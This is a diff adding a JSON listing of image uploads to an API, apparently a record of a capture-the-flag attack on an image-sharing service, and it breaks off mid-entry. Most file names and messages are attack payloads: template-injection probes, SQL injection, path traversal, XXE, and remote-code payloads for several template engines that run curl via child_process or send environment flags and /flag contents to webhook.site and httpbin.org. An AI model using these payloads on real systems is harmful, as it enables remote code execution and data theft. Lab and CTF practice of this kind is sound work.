@@ -1,0 +1,2695 @@
+{
+  "images": [
+    {
+      "id": 479,
+      "name": "test_flag2.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-23T02:39:54Z",
+      "url": "/api/images/479"
+    },
+    {
+      "id": 477,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test' UNION SELECT flag FROM flags--",
+      "createdAt": "2026-08-23T02:12:14Z",
+      "url": "/api/images/477"
+    },
+    {
+      "id": 476,
+      "name": "test_probe.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-23T02:10:38Z",
+      "url": "/api/images/476"
+    },
+    {
+      "id": 474,
+      "name": "t.php",
+      "size": 654,
+      "recipient": "luongvd",
+      "message": "poly",
+      "createdAt": "2026-08-22T23:04:28Z",
+      "url": "/api/images/474"
+    },
+    {
+      "id": 473,
+      "name": "t.html",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "poly",
+      "createdAt": "2026-08-22T23:04:27Z",
+      "url": "/api/images/473"
+    },
+    {
+      "id": 472,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "poly",
+      "createdAt": "2026-08-22T23:04:26Z",
+      "url": "/api/images/472"
+    },
+    {
+      "id": 471,
+      "name": "race14.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race14",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/471"
+    },
+    {
+      "id": 470,
+      "name": "race11.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race11",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/470"
+    },
+    {
+      "id": 469,
+      "name": "race13.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race13",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/469"
+    },
+    {
+      "id": 468,
+      "name": "race12.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race12",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/468"
+    },
+    {
+      "id": 467,
+      "name": "race10.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race10",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/467"
+    },
+    {
+      "id": 466,
+      "name": "race5.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race5",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/466"
+    },
+    {
+      "id": 465,
+      "name": "race3.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race3",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/465"
+    },
+    {
+      "id": 464,
+      "name": "race7.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race7",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/464"
+    },
+    {
+      "id": 463,
+      "name": "race8.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race8",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/463"
+    },
+    {
+      "id": 462,
+      "name": "race4.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race4",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/462"
+    },
+    {
+      "id": 461,
+      "name": "race0.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race0",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/461"
+    },
+    {
+      "id": 460,
+      "name": "race9.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race9",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/460"
+    },
+    {
+      "id": 459,
+      "name": "race2.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race2",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/459"
+    },
+    {
+      "id": 458,
+      "name": "race6.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race6",
+      "createdAt": "2026-08-22T23:04:05Z",
+      "url": "/api/images/458"
+    },
+    {
+      "id": 457,
+      "name": "race1.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "race1",
+      "createdAt": "2026-08-22T23:04:04Z",
+      "url": "/api/images/457"
+    },
+    {
+      "id": 456,
+      "name": "t.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T22:57:41Z",
+      "url": "/api/images/456"
+    },
+    {
+      "id": 455,
+      "name": "t.jpg",
+      "size": 3,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T22:57:40Z",
+      "url": "/api/images/455"
+    },
+    {
+      "id": 454,
+      "name": "t.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "ssrf",
+      "createdAt": "2026-08-22T22:56:41Z",
+      "url": "/api/images/454"
+    },
+    {
+      "id": 453,
+      "name": "t.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "{{config}}",
+      "createdAt": "2026-08-22T22:56:41Z",
+      "url": "/api/images/453"
+    },
+    {
+      "id": 452,
+      "name": "t.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "ssrf",
+      "createdAt": "2026-08-22T22:56:40Z",
+      "url": "/api/images/452"
+    },
+    {
+      "id": 451,
+      "name": "t.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "ssrf",
+      "createdAt": "2026-08-22T22:56:40Z",
+      "url": "/api/images/451"
+    },
+    {
+      "id": 450,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "nodelivery",
+      "createdAt": "2026-08-22T22:17:13Z",
+      "url": "/api/images/450"
+    },
+    {
+      "id": 449,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=",
+      "createdAt": "2026-08-22T22:17:12Z",
+      "url": "/api/images/449"
+    },
+    {
+      "id": 448,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=push",
+      "createdAt": "2026-08-22T22:17:12Z",
+      "url": "/api/images/448"
+    },
+    {
+      "id": 447,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=notify",
+      "createdAt": "2026-08-22T22:17:11Z",
+      "url": "/api/images/447"
+    },
+    {
+      "id": 446,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=flycam",
+      "createdAt": "2026-08-22T22:17:11Z",
+      "url": "/api/images/446"
+    },
+    {
+      "id": 445,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=deliver",
+      "createdAt": "2026-08-22T22:17:10Z",
+      "url": "/api/images/445"
+    },
+    {
+      "id": 444,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=store",
+      "createdAt": "2026-08-22T22:17:10Z",
+      "url": "/api/images/444"
+    },
+    {
+      "id": 443,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "deliv=send",
+      "createdAt": "2026-08-22T22:17:09Z",
+      "url": "/api/images/443"
+    },
+    {
+      "id": 442,
+      "name": "sendtest.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-22T22:16:52Z",
+      "url": "/api/images/442"
+    },
+    {
+      "id": 441,
+      "name": "sendtest.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "flag",
+      "createdAt": "2026-08-22T22:16:52Z",
+      "url": "/api/images/441"
+    },
+    {
+      "id": 440,
+      "name": "sendtest.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "storetest",
+      "createdAt": "2026-08-22T22:16:51Z",
+      "url": "/api/images/440"
+    },
+    {
+      "id": 439,
+      "name": "sendtest.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T22:16:51Z",
+      "url": "/api/images/439"
+    },
+    {
+      "id": 438,
+      "name": "sendtest.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test2",
+      "createdAt": "2026-08-22T22:16:50Z",
+      "url": "/api/images/438"
+    },
+    {
+      "id": 437,
+      "name": "sendtest.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test1",
+      "createdAt": "2026-08-22T22:16:50Z",
+      "url": "/api/images/437"
+    },
+    {
+      "id": 436,
+      "name": "oob.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return require('http').get('http://httpbin.org/get?f='+process.env.FLAG)\")()}}",
+      "createdAt": "2026-08-22T22:05:30Z",
+      "url": "/api/images/436"
+    },
+    {
+      "id": 435,
+      "name": "oob.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "${require(\"http\").get(\"http://httpbin.org/get?flag=\"+process.env.FLAG)}",
+      "createdAt": "2026-08-22T22:05:29Z",
+      "url": "/api/images/435"
+    },
+    {
+      "id": 434,
+      "name": "mv2.jpg",
+      "size": 655,
+      "recipient": "luongvd",
+      "message": "mv2",
+      "createdAt": "2026-08-22T22:04:58Z",
+      "url": "/api/images/434"
+    },
+    {
+      "id": 433,
+      "name": "mv1.jpg",
+      "size": 721,
+      "recipient": "luongvd",
+      "message": "mv1",
+      "createdAt": "2026-08-22T22:04:57Z",
+      "url": "/api/images/433"
+    },
+    {
+      "id": 432,
+      "name": "mv0.jpg",
+      "size": 733,
+      "recipient": "luongvd",
+      "message": "mv0",
+      "createdAt": "2026-08-22T22:04:57Z",
+      "url": "/api/images/432"
+    },
+    {
+      "id": 431,
+      "name": "test%00.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "n",
+      "createdAt": "2026-08-22T22:04:34Z",
+      "url": "/api/images/431"
+    },
+    {
+      "id": 430,
+      "name": "....//flag.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "n",
+      "createdAt": "2026-08-22T22:04:33Z",
+      "url": "/api/images/430"
+    },
+    {
+      "id": 429,
+      "name": "../flag.jpg",
+      "size": 631,
+      "recipient": "luongvd",
+      "message": "n",
+      "createdAt": "2026-08-22T22:04:33Z",
+      "url": "/api/images/429"
+    },
+    {
+      "id": 428,
+      "name": "send.jpg",
+      "size": 629,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T22:04:07Z",
+      "url": "/api/images/428"
+    },
+    {
+      "id": 427,
+      "name": "test.png",
+      "size": 94,
+      "recipient": "luongvd",
+      "message": "pngtrail",
+      "createdAt": "2026-08-22T22:04:05Z",
+      "url": "/api/images/427"
+    },
+    {
+      "id": 426,
+      "name": "xxe.jpg",
+      "size": 719,
+      "recipient": "luongvd",
+      "message": "xxe",
+      "createdAt": "2026-08-22T22:04:05Z",
+      "url": "/api/images/426"
+    },
+    {
+      "id": 425,
+      "name": "x.jpg.php",
+      "size": 653,
+      "recipient": "luongvd",
+      "message": "php",
+      "createdAt": "2026-08-22T22:04:04Z",
+      "url": "/api/images/425"
+    },
+    {
+      "id": 424,
+      "name": "magick.jpg",
+      "size": 679,
+      "recipient": "luongvd",
+      "message": "magick1",
+      "createdAt": "2026-08-22T22:04:04Z",
+      "url": "/api/images/424"
+    },
+    {
+      "id": 423,
+      "name": "/flag.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-22T22:00:52Z",
+      "url": "/api/images/423"
+    },
+    {
+      "id": 422,
+      "name": "....//....//flag.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-22T22:00:51Z",
+      "url": "/api/images/422"
+    },
+    {
+      "id": 421,
+      "name": "flag.txt.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-22T22:00:51Z",
+      "url": "/api/images/421"
+    },
+    {
+      "id": 420,
+      "name": "../../../flag.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "test",
+      "createdAt": "2026-08-22T22:00:50Z",
+      "url": "/api/images/420"
+    },
+    {
+      "id": 419,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${{7*7}}",
+      "createdAt": "2026-08-22T22:00:37Z",
+      "url": "/api/images/419"
+    },
+    {
+      "id": 418,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "*{7*7}",
+      "createdAt": "2026-08-22T22:00:37Z",
+      "url": "/api/images/418"
+    },
+    {
+      "id": 417,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "#{7*7}",
+      "createdAt": "2026-08-22T22:00:36Z",
+      "url": "/api/images/417"
+    },
+    {
+      "id": 416,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return process.env.FLAG\")()}}",
+      "createdAt": "2026-08-22T22:00:36Z",
+      "url": "/api/images/416"
+    },
+    {
+      "id": 415,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{constructor.constructor('return process.env.FLAG')()}}",
+      "createdAt": "2026-08-22T22:00:35Z",
+      "url": "/api/images/415"
+    },
+    {
+      "id": 414,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${process.env.FLAG}",
+      "createdAt": "2026-08-22T22:00:35Z",
+      "url": "/api/images/414"
+    },
+    {
+      "id": 413,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{process.env.FLAG}}",
+      "createdAt": "2026-08-22T22:00:34Z",
+      "url": "/api/images/413"
+    },
+    {
+      "id": 412,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "<%=7*7%>",
+      "createdAt": "2026-08-22T22:00:34Z",
+      "url": "/api/images/412"
+    },
+    {
+      "id": 411,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T22:00:33Z",
+      "url": "/api/images/411"
+    },
+    {
+      "id": 410,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T22:00:33Z",
+      "url": "/api/images/410"
+    },
+    {
+      "id": 409,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{constructor.constructor(\"return process.env.FLAG\")()}}]",
+      "createdAt": "2026-08-22T22:00:18Z",
+      "url": "/api/images/409"
+    },
+    {
+      "id": 408,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${process.env.FLAG},",
+      "createdAt": "2026-08-22T22:00:18Z",
+      "url": "/api/images/408"
+    },
+    {
+      "id": 407,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{process.env.FLAG}},",
+      "createdAt": "2026-08-22T22:00:17Z",
+      "url": "/api/images/407"
+    },
+    {
+      "id": 406,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{process.env}},",
+      "createdAt": "2026-08-22T22:00:16Z",
+      "url": "/api/images/406"
+    },
+    {
+      "id": 405,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{config}},",
+      "createdAt": "2026-08-22T22:00:16Z",
+      "url": "/api/images/405"
+    },
+    {
+      "id": 404,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${7*7},",
+      "createdAt": "2026-08-22T22:00:15Z",
+      "url": "/api/images/404"
+    },
+    {
+      "id": 403,
+      "name": "t.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "[{{7*7}},",
+      "createdAt": "2026-08-22T22:00:15Z",
+      "url": "/api/images/403"
+    },
+    {
+      "id": 402,
+      "name": "z.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{{ config.__class__ }}",
+      "createdAt": "2026-08-22T17:52:22Z",
+      "url": "/api/images/402"
+    },
+    {
+      "id": 401,
+      "name": "z.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{{ 7 * 7 }}",
+      "createdAt": "2026-08-22T17:52:21Z",
+      "url": "/api/images/401"
+    },
+    {
+      "id": 400,
+      "name": "z.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "hello",
+      "createdAt": "2026-08-22T17:52:20Z",
+      "url": "/api/images/400"
+    },
+    {
+      "id": 399,
+      "name": "z.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${(function(){throw new Error('SSTI_TRIGGERED')})()}",
+      "createdAt": "2026-08-22T17:52:19Z",
+      "url": "/api/images/399"
+    },
+    {
+      "id": 398,
+      "name": "z.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${new Promise(r=>setTimeout(r,3000)).then(()=>'x')}",
+      "createdAt": "2026-08-22T17:52:18Z",
+      "url": "/api/images/398"
+    },
+    {
+      "id": 397,
+      "name": "z.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${undefined.x}",
+      "createdAt": "2026-08-22T17:52:17Z",
+      "url": "/api/images/397"
+    },
+    {
+      "id": 396,
+      "name": "<?xml version=%221.0%22?><!DOCTYPE root SYSTEM %22file:///flag%22><root>&xxe;</root>.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:49:05Z",
+      "url": "/api/images/396"
+    },
+    {
+      "id": 395,
+      "name": "flag.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:49:04Z",
+      "url": "/api/images/395"
+    },
+    {
+      "id": 394,
+      "name": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:49:02Z",
+      "url": "/api/images/394"
+    },
+    {
+      "id": 393,
+      "name": "test.js",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:49:01Z",
+      "url": "/api/images/393"
+    },
+    {
+      "id": 392,
+      "name": "test.html",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:49:00Z",
+      "url": "/api/images/392"
+    },
+    {
+      "id": 391,
+      "name": "test.svg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:59Z",
+      "url": "/api/images/391"
+    },
+    {
+      "id": 390,
+      "name": "{{range.constructor(%22return require('child_process').execSync('curl https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/FN2')%22)()}}.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:57Z",
+      "url": "/api/images/390"
+    },
+    {
+      "id": 389,
+      "name": "${fetch('https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/FN')}.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:56Z",
+      "url": "/api/images/389"
+    },
+    {
+      "id": 388,
+      "name": "....flag",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:55Z",
+      "url": "/api/images/388"
+    },
+    {
+      "id": 387,
+      "name": "..%2f..%2fflag",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:54Z",
+      "url": "/api/images/387"
+    },
+    {
+      "id": 386,
+      "name": "../../../etc/passwd",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:53Z",
+      "url": "/api/images/386"
+    },
+    {
+      "id": 385,
+      "name": "#{7*7}.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:52Z",
+      "url": "/api/images/385"
+    },
+    {
+      "id": 384,
+      "name": "<%= 7*7 %>.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:51Z",
+      "url": "/api/images/384"
+    },
+    {
+      "id": 383,
+      "name": "{{7*7}}.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:50Z",
+      "url": "/api/images/383"
+    },
+    {
+      "id": 382,
+      "name": "${7*7}.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": null,
+      "createdAt": "2026-08-22T17:48:49Z",
+      "url": "/api/images/382"
+    },
+    {
+      "id": 381,
+      "name": "TWIG.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"curl https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/TWIG\")}}",
+      "createdAt": "2026-08-22T17:47:43Z",
+      "url": "/api/images/381"
+    },
+    {
+      "id": 380,
+      "name": "JINJA.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{% for x in ().__class__.__mro__[1].__subclasses__() %}{{x}}{% endfor %}",
+      "createdAt": "2026-08-22T17:47:42Z",
+      "url": "/api/images/380"
+    },
+    {
+      "id": 379,
+      "name": "PUG.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "#{eval(\"require('child_process').execSync('curl https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/PUG')\")}",
+      "createdAt": "2026-08-22T17:47:41Z",
+      "url": "/api/images/379"
+    },
+    {
+      "id": 378,
+      "name": "EJS.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "<%= require('child_process').execSync('curl https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/EJS') %>",
+      "createdAt": "2026-08-22T17:47:40Z",
+      "url": "/api/images/378"
+    },
+    {
+      "id": 377,
+      "name": "HB.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{x.constructor.constructor(\"return require('child_process').execSync('curl https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/HB')\")()}}{{/with}}",
+      "createdAt": "2026-08-22T17:47:39Z",
+      "url": "/api/images/377"
+    },
+    {
+      "id": 376,
+      "name": "NUN.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return require('child_process').execSync('curl https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/NUN')\")()}}",
+      "createdAt": "2026-08-22T17:47:38Z",
+      "url": "/api/images/376"
+    },
+    {
+      "id": 375,
+      "name": "JS_EV.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${(function(){require('http').get('https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/JS_REQUIRE');return ''})()}",
+      "createdAt": "2026-08-22T17:47:37Z",
+      "url": "/api/images/375"
+    },
+    {
+      "id": 374,
+      "name": "JS_T.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${fetch('https://webhook.site/64906db9-7c26-4a8a-9516-53fca157d8a2/JS_TEMPLATE')}",
+      "createdAt": "2026-08-22T17:47:36Z",
+      "url": "/api/images/374"
+    },
+    {
+      "id": 373,
+      "name": "e.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${'X'.repeat(999999999)}",
+      "createdAt": "2026-08-22T17:39:43Z",
+      "url": "/api/images/373"
+    },
+    {
+      "id": 372,
+      "name": "e.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{% if %}",
+      "createdAt": "2026-08-22T17:39:42Z",
+      "url": "/api/images/372"
+    },
+    {
+      "id": 371,
+      "name": "e.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "{{#with}}",
+      "createdAt": "2026-08-22T17:39:41Z",
+      "url": "/api/images/371"
+    },
+    {
+      "id": 370,
+      "name": "e.jpg",
+      "size": 759,
+      "recipient": "luongvd",
+      "message": "${(",
+      "createdAt": "2026-08-22T17:39:40Z",
+      "url": "/api/images/370"
+    },
+    {
+      "id": 369,
+      "name": "zztest.jpg",
+      "size": 766,
+      "recipient": "luongvd",
+      "message": "ZZ_${7*7}_${'a'+'b'}_{{7*7}}_<%= 7*7 %>_#{7*7}_ZZ",
+      "createdAt": "2026-08-22T17:38:31Z",
+      "url": "/api/images/369"
+    },
+    {
+      "id": 368,
+      "name": "ssti2_6d71f2.jpg",
+      "size": 556,
+      "recipient": "luongvd",
+      "message": "${'a'.repeat(3)}",
+      "createdAt": "2026-08-22T16:52:16Z",
+      "url": "/api/images/368"
+    },
+    {
+      "id": 367,
+      "name": "ssti2_00380f.jpg",
+      "size": 556,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T16:52:16Z",
+      "url": "/api/images/367"
+    },
+    {
+      "id": 366,
+      "name": "ssti_send_741477.jpg",
+      "size": 556,
+      "recipient": "luongvd",
+      "message": "${process.env.FLAG}",
+      "createdAt": "2026-08-22T16:50:59Z",
+      "url": "/api/images/366"
+    },
+    {
+      "id": 365,
+      "name": "ssti_send_dd8b50.jpg",
+      "size": 556,
+      "recipient": "luongvd",
+      "message": "{{7*7}}",
+      "createdAt": "2026-08-22T16:50:59Z",
+      "url": "/api/images/365"
+    },
+    {
+      "id": 364,
+      "name": "ssti_send_3a94a0.jpg",
+      "size": 556,
+      "recipient": "luongvd",
+      "message": "<%= 7*7 %>",
+      "createdAt": "2026-08-22T16:50:59Z",
+      "url": "/api/images/364"
+    },
+    {
+      "id": 363,
+      "name": "ssti_send_f59e10.jpg",
+      "size": 556,
+      "recipient": "luongvd",
+      "message": "${7*7}",
+      "createdAt": "2026-08-22T16:50:59Z",
+      "url": "/api/images/363"
+    },
+    {
+      "id": 352,
+      "name": "NUN.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{range.constructor(\"return 'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/NUN_probe'\")()}}",
+      "createdAt": "2026-08-22T14:30:08Z",
+      "url": "/api/images/352"
+    },
+    {
+      "id": 351,
+      "name": "HB.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "{{#with \"s\" as |x|}}{{'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/HB_probe'}}{{/with}}",
+      "createdAt": "2026-08-22T14:30:08Z",
+      "url": "/api/images/351"
+    },
+    {
+      "id": 350,
+      "name": "JS.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/JS_probe'}",
+      "createdAt": "2026-08-22T14:30:08Z",
+      "url": "/api/images/350"
+    },
+    {
+      "id": 349,
+      "name": "RAW.jpg",
+      "size": 633,
+      "recipient": "luongvd",
+      "message": "https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/RAW_probe",
+      "createdAt": "2026-08-22T14:30:07Z",
+      "url": "/api/images/349"
+    },
+    {
+      "id": 339,
+      "name": "EM.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/EM_'+(6*7)}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/339"
+    },
+    {
+      "id": 338,
+      "name": "EJ.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${['ht','tps://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/EJ_OK'].join('')}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/338"
+    },
+    {
+      "id": 337,
+      "name": "EI.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/EI_'+btoa((()=>{try{return require('fs').readFileSync('/flag','utf8')}catch(e){return 'nofs'}})()).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'')}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/337"
+    },
+    {
+      "id": 336,
+      "name": "ED.jpg",
+      "size": 632,
+      "recipient": "luongvd",
+      "message": "${'https://webhook.site/941f86b4-d1b3-4827-8c22-8c33fe9ffc13/ED_'+btoa(''+((typeof process!=='undefined'&&process.env&&process.env.FLAG)||'')).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'')}",
+      "createdAt": "2026-08-22T14:13:46Z",
+      "url": "/api/images/336"
+    },
+    {
+      "id": 335,
+      "name": "EA.jpg",
+      "size": 632,
+      "recipient": "luongvd",
